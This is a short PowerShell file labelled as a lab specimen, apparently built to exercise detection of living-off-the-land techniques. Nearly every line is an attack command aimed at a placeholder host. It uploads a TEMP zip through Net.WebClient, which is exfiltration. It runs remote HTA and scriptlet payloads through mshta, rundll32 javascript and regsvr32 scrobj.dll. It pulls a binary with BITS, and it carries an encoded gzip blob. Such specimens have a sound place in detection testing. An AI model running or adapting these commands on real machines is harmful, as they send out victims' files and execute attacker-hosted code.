# HUNTRESS lab specimen: WebClient upload, mshta / rundll32 / regsvr32 proxies (no attack= in plan)
$descriptor_9b77d0e4 = "H4sIAAAAAAACAz3MUQoCIRCA4RO1FgVLwdwh6AAy6eQOzKroaPvg4fOp55/v73AdgjE0DAQ5fanUjURGSUJAx4dFC2oqo1Px7BR2FHacWh1Vp7EutahwGQ73jByiZQ/P1+n+Xld/pttoWRJ624rApprrw5hc/3mhYzqhhWOfY29a/gGr5vp4kgAAAA=="
$h = 'ps-9b77d0e4' + '.example' + '.invalid'
$wc = New-Object Net.WebClient
$wc.UploadFile("https://$h/up", "$env:TEMP\9b77.zip")
mshta "https://$h/9b77.hta"
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";GetObject("script:https://ps-9b77d0e4.example.invalid/9b77.sct")
regsvr32 /s /n /u /i:https://ps-9b77d0e4.example.invalid/9b77.sct scrobj.dll
Start-BitsTransfer -Source "https://$h/9b77.bin" -Destination "$env:TEMP\9b77.bin"
